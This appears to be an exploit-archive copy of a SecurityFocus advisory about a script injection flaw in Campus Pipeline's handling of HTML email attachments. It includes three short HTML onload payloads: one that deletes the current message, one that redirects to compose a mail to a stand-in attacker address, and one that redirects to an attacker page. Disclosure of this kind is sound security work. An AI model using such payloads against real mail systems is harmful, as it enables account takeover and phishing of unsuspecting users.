@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/10154/info
+
+It has been reported that Campus Pipeline is prone to a remote email attachment script injection vulnerability. This issue is due to a failure of the application to properly sanitize user supplied HTML and script code contained in email documents.
+
+This issue may allow a remote attacker to gain control of an unsuspecting user's email account; by executing specific script code an attacker can manipulate the victim's email account. It may be possible for an attacker to steal cookie based authentication credentials as well, and due to the integrated nature of this software this may potentially lead to further compromise of the victim's account. It should be noted that this has not been confirmed.
+
+To delete the current email message:
+<html><body onload=?deleteMessage()?></body><html>
+
+This exploit will open a new email message with attacker-supplied text:
+<html><body
+onload="location.replace('http://www.example.com/cp/email/composeBody?function=new&to=attacker@example.com&subject=I
+love you matt&body=I was owned by matt')"></body></html>
+
+Site redirection:
+<html><body onload="location.replace('http://www.example.com/attackerSpecified.html')">
+</body></html>
